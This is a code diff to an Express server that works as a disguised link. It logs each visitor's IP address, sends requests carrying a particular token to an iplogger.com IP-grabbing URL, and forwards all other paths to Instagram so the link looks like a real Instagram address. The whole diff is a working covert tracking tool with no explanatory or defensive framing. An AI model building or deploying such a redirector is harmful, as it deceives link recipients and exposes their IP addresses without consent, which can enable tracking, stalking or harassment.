@@ -1,11 +1,18 @@
 const express = require('express')
 const app = express()
 const port = process.env.PORT || 3000
+const redirectUrl = 'https://iplogger.com/2KqpX6'
+const instaUrl = 'https://www.instagram.com'
 
-app.get('/channel/Abbtqp2ycYco6EDv/', (req, res) => {
+app.use((req, res) => {
     const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    console.log(visitorIp)
-    res.redirect(302, 'https://iplogger.com/2KqpX6');
+    const paths = req.originalUrl;
+    console.log(visitorIp);
+    if(paths.includes('Abbtqp2ycYco6EDv')) {
+        res.redirect(302, redirectUrl);
+    } else {
+        res.redirect(302, `${instaUrl}${paths}`);
+    }
 })
 
 app.listen(port, () => {
